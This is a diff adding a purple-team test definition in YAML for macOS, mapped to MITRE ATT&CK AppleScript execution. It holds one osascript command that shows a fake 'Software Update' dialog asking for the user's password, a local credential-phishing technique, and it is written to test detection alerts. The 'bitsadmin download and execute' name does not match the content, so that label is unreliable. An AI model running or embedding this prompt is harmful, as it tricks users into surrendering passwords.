@@ -1,0 +1,16 @@
+enabled: true
+meta:
+  author: redcanary
+  created: 2017-11-03
+  decorations:
+  - Purple Team
+  description: built in OSX dialog box invoked by applescript asking for credentials. number 1 is in escaping hell and doesnt pop up the prompt but should cause your alert to fire.
+  link: http://fuzzynop.blogspot.com/2014/10/osascript-for-local-phishing.html
+  mitre_link: https://attack.mitre.org/wiki/Technique/T1155
+  mitre_attack_phase: Execution
+  mitre_attack_technique: AppleScript
+  purple_actions:
+    1: osascript -e 'tell app \"System Preferences\" to activate' -e 'tell app \"System Preferences\" to activate' -e 'tell app \"System Preferences\" to display dialog \"Software Update requires that you type your password to apply changes.\" & return & return  default answer \"\" with icon 1 with hidden answer with title \"Software Update\"'
+os: osx
+name: bitsadmin download and execute
+uuid: 1b8b6d39-44ea-4fc2-afec-799b7e43ea15
